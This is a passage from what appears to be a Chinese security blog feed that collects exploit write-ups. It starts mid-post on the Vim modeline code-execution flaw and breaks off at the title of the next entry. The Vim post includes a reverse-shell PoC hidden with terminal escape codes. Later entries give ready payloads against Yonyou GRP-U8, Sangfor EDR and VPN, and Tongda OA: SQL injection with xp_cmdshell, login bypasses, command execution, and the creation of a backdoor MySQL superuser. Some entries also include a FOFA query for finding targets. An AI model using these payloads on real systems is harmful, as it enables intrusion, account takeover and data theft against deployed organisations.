<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; vim&#x2F;src&#x2F;ex_cmds.c</span><br><span class="line">&#x2F;*</span><br><span class="line"> * Check if the secure flag is set (.exrc or .vimrc in current directory).</span><br><span class="line"> * If so, give an error message and return TRUE.</span><br><span class="line"> * Otherwise, return FALSE.</span><br><span class="line"> *&#x2F;</span><br><span class="line">    int</span><br><span class="line">check_secure(void)</span><br><span class="line">&#123;</span><br><span class="line">    if (secure)</span><br><span class="line">    &#123;</span><br><span class="line">    secure &#x3D; 2;</span><br><span class="line">    emsg(_(e_curdir));</span><br><span class="line">    return TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">#ifdef HAVE_SANDBOX</span><br><span class="line">    &#x2F;*</span><br><span class="line">     * In the sandbox more things are not allowed, including the things</span><br><span class="line">     * disallowed in secure mode.</span><br><span class="line">     *&#x2F;</span><br><span class="line">    if (sandbox !&#x3D; 0)</span><br><span class="line">    &#123;</span><br><span class="line">    emsg(_(e_sandbox));</span><br><span class="line">    return TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br><span class="line">    return FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>check_secure函数在一些涉及敏感操作的地方被用到，例如在buf_write函数中的使用，禁止了在沙箱模式下写buf文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F; vim&#x2F;src&#x2F;fileio.c</span><br><span class="line">    int</span><br><span class="line">buf_write(...)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">    &#x2F;*</span><br><span class="line">     * Disallow writing from .exrc and .vimrc in current directory for</span><br><span class="line">     * security reasons.</span><br><span class="line">     *&#x2F;</span><br><span class="line">    if (check_secure())</span><br><span class="line">      return FAIL;</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然而在:source!命令中，并没有进行沙箱检查。:source!命令用于在命令模式下逐个运行目标文件中的命令，通常被用来加载配置文件。同时，在命令模式下有多种方式执行shell脚本。</p>
<p>前文提到，可以在modeline中设置的配置项是有限的，因此需要一个能让我们执行:source!的配置项。</p>
<p>配置项的限制是通过P_SECURE这个flag来判断的，foldexpr没有设置P_SECURE，符合要求。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F; vim&#x2F;src&#x2F;option.c</span><br><span class="line">&#x2F;&#x2F; foldexpr 未设置P_SECURE</span><br><span class="line">static struct vimoption options[] &#x3D;</span><br><span class="line">&#123;</span><br><span class="line">   &#x2F;&#x2F; ...</span><br><span class="line">    &#123;&quot;foldexpr&quot;,    &quot;fde&quot;,  P_STRING|P_ALLOCED|P_VIM|P_VI_DEF|P_RWIN|P_MLE,</span><br><span class="line">#if defined(FEAT_FOLDING) &amp;&amp; defined(FEAT_EVAL)</span><br><span class="line">                (char_u *)VAR_WIN, PV_FDE,</span><br><span class="line">                &#123;(char_u *)&quot;0&quot;, (char_u *)NULL&#125;</span><br><span class="line">#else</span><br><span class="line">                (char_u *)NULL, PV_NONE,</span><br><span class="line">                &#123;(char_u *)NULL, (char_u *)0L&#125;</span><br><span class="line">#endif</span><br><span class="line">                SCTX_INIT&#125;</span><br><span class="line">&#x2F;&#x2F; ...          </span><br><span class="line">&#125;;</span><br><span class="line">&#x2F;&#x2F; ...</span><br><span class="line">&#x2F;&#x2F; 通过option的flag判断</span><br><span class="line">if (flags &amp; (P_SECURE | P_NO_ML))</span><br><span class="line">&#123;</span><br><span class="line">    errmsg &#x3D; _(&quot;E520: Not allowed in a modeline&quot;);</span><br><span class="line">    goto skip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因此，可以构造PoC如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">:!uname -a||&quot; vi:fen:fdm&#x3D;expr:fde&#x3D;assert_fails(&quot;source\!\ \%&quot;):fdl&#x3D;0:fdt&#x3D;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>保存成文件poc.txt，用Vim打开，命令uname -a将会被执行。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/zzzzz-1.jpg" alt="img"></p>
<h3 id="0x02-POC-分析"><a href="#0x02-POC-分析" class="headerlink" title="0x02 POC 分析"></a><strong>0x02 POC 分析</strong></h3><p>命令执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># poc.txt</span><br><span class="line">:!uname -a||&quot; vi:fen:fdm&#x3D;expr:fde&#x3D;assert_fails(&quot;source\!\ \%&quot;):fdl&#x3D;0:fdt&#x3D;&quot;&lt;&#x2F;code&gt;&lt;br &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>打开poc.txt时，Vim会在首行寻找modeline，从vi:处开始匹配，忽略前面的字符，解析出的modeline表达式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi:fen:fdm&#x3D;expr:fde&#x3D;assert_fails&lt;code class&#x3D;&quot;language-bash&quot;&gt;(&quot;source\!\ \%&quot;)&lt;&#x2F;code&gt;:fdl&#x3D;0:fdt&#x3D;</span><br></pre></td></tr></table></figure>

<p>modeline中的配置项(option settings)通过:分隔，vi后面的每一项都会当做:set的参数在normal模式下被运行。</p>
<p>这里的一系列配置都是有关于代码折叠的，让我们逐个解析配置项:</p>
<ul>
<li>fen: 当值为off时，所有的代码折叠都被打开，默认是off</li>
<li>fdm=expr: 产生折叠的方式，可能的值有manual, indent, expr, marker, syntax, diff。 其中expr表示将由’foldexpr’的值来给出某一行的折叠level</li>
<li>fde=assert_fails(“source! %”): fde是foldexpr的缩写，功能见上一条；source!命令前文已经提过，这里的%是指当前文件；assert_fails用于执行命令并处理错误信息，这里我们只用于执行命令。</li>
<li>fdl=0: 折叠的程度，设置为0时会关闭所有的折叠，默认是0</li>
<li>fdt: 被关闭的折叠处显示的字符串,默认是”foldtext()”</li>
</ul>
<p>综合下来，这个modeline会让Vim执行:source! poc.txt，让我们来看会发生什么。</p>
<p>poc.txt中只有一行，相当于在Vim normal mode中运行这一行，:!xxx表示在shell中执行xxx命令。</p>
<p>所以，下面的命令会在shell中被执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi:fen:fdm&#x3D;expr:fde&#x3D;assert_fails&lt;code class&#x3D;&quot;language-bash&quot;&gt;(&quot;source\!\ \%&quot;)&lt;&#x2F;code&gt;:fdl&#x3D;0:fdt&#x3D;</span><br></pre></td></tr></table></figure>

<p>||表示只有在前一个命令执行失败后才会执行后一个命令，在这里uname -a会执行成功，||后面的字符串被忽略，所以PoC到这里就执行成功了。</p>
<h3 id="0x03-反弹shell"><a href="#0x03-反弹shell" class="headerlink" title="0x03 反弹shell"></a><strong>0x03 反弹shell</strong></h3><p>漏洞作者给出了另一个PoC，可以反弹一个shell, 利用了转义字符使得恶意代码在终端不可见，还在PoC执行结束后重写了文件使得痕迹被彻底清除。</p>
<p># 在另一终端窗口运行nc -vlp 9999</p>
<p># shell.txt</p>
<p>x1b[?7lx1bSNothing here.x1b:silent! w | call system(‘nohup nc 127.0.0.1 9999 -e /bin/sh &amp;’) | redraw! | file | silent! # ” vim: set fen fdm=expr fde=assert_fails(‘set\ fde=x\ |\ source!\ %’) fdl=0: x16x1b[1Gx16x1b[KNothing here.”x16x1b[D n</p>
<p>除去转义字符和重写文件部分，可以简化成如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># shell_simple.txt</span><br><span class="line">:call system(&#39;nohup nc 127.0.0.1 9999 -e &#x2F;bin&#x2F;sh &amp;&#39;)  ||&quot; vi:fen:fdm&#x3D;expr:fde&#x3D;assert_fails(&quot;source! %&quot;):fdl&#x3D;0:fdt&#x3D;&quot;</span><br></pre></td></tr></table></figure>

<p>由前面的知识我们可以知道，此poc会在vim的normal模式下运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:call system(&#39;nohup nc 127.0.0.1 9999 -e &#x2F;bin&#x2F;sh &amp;&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/111.gif" alt="img"></p>
<p>拆开分析：</p>
<ul>
<li>call: 执行一个函数</li>
<li>system(): 执行shell命令</li>
<li>nohup nc 127.0.0.1 9999 -e /bin/sh &amp;： 反弹shell</li>
</ul>
<p><strong>ps:</strong></p>
<p><strong>modeline功能必须打开</strong></p>
<p>普通用户的modeline功能默认开启，而root用户是默认关闭的。</p>
<p>可以在命令模式下使用:echo &amp;modeline查看开启情况，返回1就是开启、0就是关闭。modeline功能</p>
<p>需要打开，PoC才能成功运行，可以在~/.vimrc中(若没有自行创建)加上一行set modeline确保开启此功能。</p>
<p>第二个反弹shell的PoC，复制粘贴到本地运行会失败</p>
<p>该问题出现在转义字符上，用二进制查看工具Okteta打开shell.txt，可以看到转义字符x1b是非显示字符。转义字符常常用来控制终端显示、光标移动等，第二个PoC中就利用了转义字符隐藏代码的功能，有关转义字符的知识可以参考这个链接<a href="http://notes.burke.libbey.me/ansi-escape-codes/">ansi-escape-codes</a>。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/cccc.png" alt="img"></p>
<table>
<thead>
<tr>
<th>1234</th>
<th>$ cat shell.txt  # 部分输出在终端中被隐藏Nothing here$ cat -A shell.txt ^[[?7l^[SNothing here.^[:silent! w | call system(‘nohup nc 127.0.0.1 9999 -e /bin/sh &amp;’) | redraw! | file | silent! # “ vim: set fen fdm=expr fde=assert_fails(‘set fde=x | source! %’) fdl=0: ^V^[[1G^V^[[KNothing here.”^V^[[D $</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>作者文章给出代码中的x1b是为了更清晰地表达，并不能直接复制使用。</p>
<p>所以如果我们想要修改第二段利用代码，比较简单的方式是是下载源文件，修改执行命令的部分，当然也可以使用二进制编辑器直接编写或修改。</p>
<h3 id="0x04-修复"><a href="#0x04-修复" class="headerlink" title="0x04 修复"></a>0x04 修复</h3><p>Vim发布了 patch 8.1.1365: source command doesn’t check for the sandbox</p>
<p>在openscript函数中增加了沙箱的检查，防止在沙箱中source文件。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1111-1.png" alt="img"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/222-2.png" alt="img"> <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1111-1.png" alt="img"></p>
<h3 id="0x05-安全建议"><a href="#0x05-安全建议" class="headerlink" title="0x05 安全建议"></a>0x05 安全建议</h3><ol>
<li><ol>
<li>更新到vim &gt;= 8.1.1365 / neovim &gt; v0.3.6</li>
<li>在vimrc中加入set nomodeline，禁用modeline</li>
<li>不要轻易打开来路不明的文件</li>
</ol>
</li>
</ol>
<h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p><a href="https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md">2019-06-04_ace-vim-neovim</a></p>
<p><a href="https://www.anquanke.com/post/id/180386">Slash analyze</a></p>
<p><a href="https://vimhelp.org/">vim online help</a></p>
<p><a href="https://github.com/vim/vim/commit/5357552">vim patch</a></p>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>VIM</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>用友GRP-u8 注入</title>
    <url>/2020/09/13/WEB/Exploit/%E7%94%A8%E5%8F%8BGRP-u8-%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914141058235.png" alt="image-20200914141058235"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;Proxy HTTP&#x2F;1.1Content-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 6.0;)Host: localhostContent-Length: 341Connection: Keep-AliveCache-Control: no-cache</span><br><span class="line">cVer&#x3D;9.8.0&amp;dp&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;GB2312&quot;?&gt;&lt;R9PACKET version&#x3D;&quot;1&quot;&gt;&lt;DATAFORMAT&gt;XML&lt;&#x2F;DATAFORMAT&gt;&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;&#x2F;NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;&#x2F;NAME&gt;&lt;DATA format&#x3D;&quot;text&quot;&gt;DataSetProviderData&lt;&#x2F;DATA&gt;&lt;&#x2F;PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;&#x2F;NAME&gt;&lt;DATA format&#x3D;&quot;text&quot;&gt;exec xp_cmdshell &#39;whoami&#39;&lt;&#x2F;DATA&gt;&lt;&#x2F;PARAM&gt;&lt;&#x2F;PARAMS&gt;&lt;&#x2F;R9FUNCTION&gt;&lt;&#x2F;R9PACKET&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>用友</tag>
      </tags>
  </entry>
  <entry>
    <title>深信服-SANGFOR终端检测响应平台-任意用户登录</title>
    <url>/2020/09/13/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D-SANGFOR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/</url>
    <content><![CDATA[<p>前两天爆出来的命令执行，今天在给大家爆一个任意用户登录；<br>看源码看到的，我测试的时候可以打到3.2.19版本，后面的版本我就不知道了；</p>
<p>fofa指纹：<strong>title=”SANGFOR终端检测响应平台”</strong></p>
<hr>
<p>漏洞利用：</p>
<p>只要用户存在就可以登陆</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ip&#x2F;ui&#x2F;login.php?user&#x3D;需登录的用户名</span><br></pre></td></tr></table></figure>

<p>列如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;1.1.1.1:1980&#x2F;ui&#x2F;login.php?user&#x3D;admin</span><br></pre></td></tr></table></figure>

<p>查询完毕以后即可登录平台。<br><a href="https://www.hackbug.net/usr/uploads/2020/08/3963593927.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/3963593927.png" alt="QQ截图20200820123214.png"></a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>sangfor</tag>
      </tags>
  </entry>
  <entry>
    <title>深信服 SSL VPN - Pre Auth 修改绑定手机</title>
    <url>/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D-SSL-VPN-Pre-Auth-%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/</url>
    <content><![CDATA[<h2 id="漏洞起因："><a href="#漏洞起因：" class="headerlink" title="漏洞起因："></a>漏洞起因：</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160030652.png" alt="image-20200917160030652"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>老版本(M7.6.1)代码放上，看不懂的直接看 POC 吧；新版本的没绕成功还在审，所以不确定是不是这个</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160439482.png" alt="image-20200917160439482"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160456180.png" alt="image-20200917160456180"></p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">https://&lt;path&gt;/por/changetelnum.csp?apiversion=1</span><br><span class="line"></span><br><span class="line">newtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sessid=0&amp;ip=127.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160603185.png" alt="image-20200917160603185"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>sangfor</tag>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title>深信服EDR3.2.21 任意代码执行漏洞分析</title>
    <url>/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR3-2-21-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154417360.png" alt="image-20200917154417360"></p>
<p>dev_linkage_launch.php 为设备联动的新入口点主要是将联动的接口构造成业务统一处理的接口</p>
<h3 id="主要调用"><a href="#主要调用" class="headerlink" title="主要调用"></a>主要调用</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154552300.png" alt="image-20200917154552300"></p>
<p>跟进</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154605381.png" alt="image-20200917154605381"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以看到 第一个检查为  req_url&#x3D;_SERVER[&#39;PHP_SELF&#39;];</span><br><span class="line"></span><br><span class="line">绕过第一个检查:</span><br><span class="line"></span><br><span class="line">在他们系统nginx配置文件里面:</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154713639.png" alt="image-20200917154713639"></p>
<p><strong>通过</strong>nginx规则可以得知,他们没有设置禁止外网访问.从而可以直接访问</p>
<p>/api/edr/sangforinter/v2/xxx 绕过 第一个检查</p>
<h3 id="第二检查-权限检查"><a href="#第二检查-权限检查" class="headerlink" title="第二检查**:** 权限检查"></a><strong>第二检查**</strong>:** <strong>权限检查</strong></h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155137057.png" alt="image-20200917155137057">跟进check_access_token</p>
<p> <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1062563-20200911105704599-1994739155.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里if(md5_str&#x3D;&#x3D;json_token[&quot;md5&quot;]) 引发第二个漏洞: php弱类型导致的漏洞</span><br><span class="line"></span><br><span class="line">绕过只需要传入一个base64编码的json内容为 &#123;“md5”:true&#125;即可</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>至此**</strong>权限检查绕过完毕**</p>
<p><strong>来到</strong> process_cssp.php 文件</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155330169.png" alt="image-20200917155330169"></p>
<p>存在任意指令执行漏洞.作者试图使用escapeshellarg函数去给单引号打反斜杠实际上是毫无作用的.</p>
<p>绕过:{“params”:”w=123&quot;‘1234123’&quot;|命令”}</p>
<h2 id="结果如下"><a href="#结果如下" class="headerlink" title="结果如下"></a>结果如下</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155504277.png" alt="image-20200917155504277"></p>
<p>返回：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155558597.png" alt="image-20200917155558597"></p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>sangfor</tag>
        <tag>EDR</tag>
      </tags>
  </entry>
  <entry>
    <title>深信服edr远程命令执行cnvd-2020-46552漏洞分析</title>
    <url>/2020/09/13/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8Dedr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="EDR简介"><a href="#EDR简介" class="headerlink" title="EDR简介"></a>EDR简介</h1><p>终端检测响应平台（EDR）是深信服公司提供的一套终端安全解决方案，方案由轻量级的端点安全软件（Agent）和管理平台（MGR）共同组成。</p>
<p>漏洞复现：</p>
<h1 id="远程命令执行漏洞CNVD-2020-46552"><a href="#远程命令执行漏洞CNVD-2020-46552" class="headerlink" title="远程命令执行漏洞CNVD-2020-46552"></a>远程命令执行漏洞CNVD-2020-46552</h1><p><a href="https://xn--ip+-0y3e189o/tool/log/c.php?strip_slashes=system&host=id">https://ip+端口/tool/log/c.php?strip_slashes=system&amp;host=id</a></p>
<p><a href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154516622.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200909154516622.png" alt="img"></a></p>
<p><a href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154516622.png">img</a></p>
<p>漏洞分析：</p>
<p>将c.php中的文件进行分析</p>
<p><a href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154516609.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200909154516609.png" alt="img"></a></p>
<p><a href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154516609.png">img</a></p>
<p>$_REQUEST将传入的参数保存为数组，将前台的参数传入到$show_form</p>
<p>进入$show_form</p>
<p><a href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage.png" alt="img"></a></p>
<p><a href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage.png">img</a></p>
<p>使用了匿名函数，use调用了外部变量$strip_slashes、$show_input</p>
<p>extract()函数会从数组中将变量导入到当前的符号表。他会把数组变成变量，函数使用数组的键名为变量名，键值为变量值</p>
<p>$host是如果存在就执行$strip_slashes($host)</p>
<p>那么传参数的时候使用:strip_slashes=system&amp;host=id</p>
<p><a href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154517340.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200909154517340.png" alt="img"></a></p>
<p><a href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154517340.png">img</a></p>
<p>strip_slashes函数的作用是去掉&amp;变量中的\</p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>sangfor</tag>
        <tag>EDR</tag>
      </tags>
  </entry>
  <entry>
    <title>通达OA v11.7 后台SQL注入</title>
    <url>/2020/09/17/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA-v11-7-%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>需要登录权限</p>
<p>原文作者给出了利用链注入加mysql权限，又是写木马的。用起来很舒服</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;general&#x2F;hr&#x2F;manage&#x2F;query&#x2F;delete_cascade.php?condition_cascade&#x3D;select%20if((substr(user(),1,1)&#x3D;%27r%27),1,power(9999,99))</span><br></pre></td></tr></table></figure>

<p>1、添加一个mysql用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grant all privileges ON mysql.* TO &#39;ateam666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917165121752.png" alt="image-20200917165121752"></p>
<p>2、给创建的ateam666账户添加mysql权限。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE &#96;mysql&#96;.&#96;user&#96; SET &#96;Password&#96; &#x3D; &#39;*DE0742FA79F6754E99FDB9C8D2911226A5A9051D&#39;, &#96;Select_priv&#96; &#x3D; &#39;Y&#39;, &#96;Insert_priv&#96; &#x3D; &#39;Y&#39;, &#96;Update_priv&#96; &#x3D; &#39;Y&#39;, &#96;Delete_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_priv&#96; &#x3D; &#39;Y&#39;, &#96;Drop_priv&#96; &#x3D; &#39;Y&#39;, &#96;Reload_priv&#96; &#x3D; &#39;Y&#39;, &#96;Shutdown_priv&#96; &#x3D; &#39;Y&#39;, &#96;Process_priv&#96; &#x3D; &#39;Y&#39;, &#96;File_priv&#96; &#x3D; &#39;Y&#39;, &#96;Grant_priv&#96; &#x3D; &#39;Y&#39;, &#96;References_priv&#96; &#x3D; &#39;Y&#39;, &#96;Index_priv&#96; &#x3D; &#39;Y&#39;, &#96;Alter_priv&#96; &#x3D; &#39;Y&#39;, &#96;Show_db_priv&#96; &#x3D; &#39;Y&#39;, &#96;Super_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_tmp_table_priv&#96; &#x3D; &#39;Y&#39;, &#96;Lock_tables_priv&#96; &#x3D; &#39;Y&#39;, &#96;Execute_priv&#96; &#x3D; &#39;Y&#39;, &#96;Repl_slave_priv&#96; &#x3D; &#39;Y&#39;, &#96;Repl_client_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_view_priv&#96; &#x3D; &#39;Y&#39;, &#96;Show_view_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_routine_priv&#96; &#x3D; &#39;Y&#39;, &#96;Alter_routine_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_user_priv&#96; &#x3D; &#39;Y&#39;, &#96;Event_priv&#96; &#x3D; &#39;Y&#39;, &#96;Trigger_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_tablespace_priv&#96; &#x3D; &#39;Y&#39;, &#96;ssl_type&#96; &#x3D; &#39;&#39;, &#96;ssl_cipher&#96; &#x3D; &#39;&#39;, &#96;x509_issuer&#96; &#x3D; &#39;&#39;, &#96;x509_subject&#96; &#x3D; &#39;&#39;, &#96;max_questions&#96; &#x3D; 0, &#96;max_updates&#96; &#x3D; 0, &#96;max_connections&#96; &#x3D; 0, &#96;max_user_connections&#96; &#x3D; 0, &#96;plugin&#96; &#x3D; &#39;mysql_native_password&#39;, &#96;authentication_string&#96; &#x3D; &#39;&#39;, &#96;password_expired&#96; &#x3D; &#39;Y&#39; WHERE &#96;Host&#96; &#x3D; Cast(&#39;%&#39; AS Binary(1)) AND &#96;User&#96; &#x3D; Cast(&#39;ateam666&#39; AS Binary(5));</span><br></pre></td></tr></table></figure>

<p>3、刷新数据库就可以登录到数据库啦。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;general&#x2F;hr&#x2F;manage&#x2F;query&#x2F;delete_cascade.php?condition_cascade&#x3D;flush privileges;</span><br></pre></td></tr></table></figure>

<p>4、通达OA配置mysql默认是不开启外网访问的所以需要修改mysql授权登录。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;general&#x2F;hr&#x2F;manage&#x2F;query&#x2F;delete_cascade.php?condition_cascade&#x3D;</span><br><span class="line"></span><br><span class="line">grant all privileges ON mysql.* TO &#39;ateam666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</span><br></pre></td></tr></table></figure>

<p>5、接下来就是考验mysql提权功底的时候啦 </p>
<p>参考链接：<a href="https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw">https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>通达OA</tag>
      </tags>
  </entry>
  <entry>
    <title>通达OA任意用户登陆</title>
    <url>/2020/09/15/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86/</url>
    <content><![CDATA[<p>1、首先访问 /ispirit/login_code.php 获取 codeuid。</p>
<p>2、访问 /general/login_code_scan.php 提交 post 参数：</p>
<p>uid=1&amp;codeuid={9E908086-342B-2A87-B0E9-E573E226302A}</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200915095052094.png" alt="image-20200915095052094"></p>
<p>然后构造数据包请求/logincheck_code.php 得到cookie</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200915095153086.png" alt="image-20200915095153086"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>通达OA</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞学习实践一-从Serializbale接口开始先弹一个计算器</title>
